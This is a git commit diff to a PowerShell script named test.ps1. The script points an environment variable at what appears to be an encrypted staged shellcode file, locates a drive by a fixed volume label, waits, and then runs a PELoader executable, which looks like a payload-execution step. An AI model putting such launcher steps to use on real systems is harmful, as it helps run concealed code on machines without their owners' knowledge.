2f12c589c44bdabce1d994d3ef40a0e2cf9b820f
RkDx <61869865+RkDx@users.noreply.github.com>
2022-09-21 18:50:38 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,3 +1,5 @@
 $Env:hagrid="ghost staged.shc.exe.enc";
+$device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "CV-d065c789ca4aede" | foreach { $_.DeviceID });
+cd $device;
 sleep 10;
 .\PELoader.exe
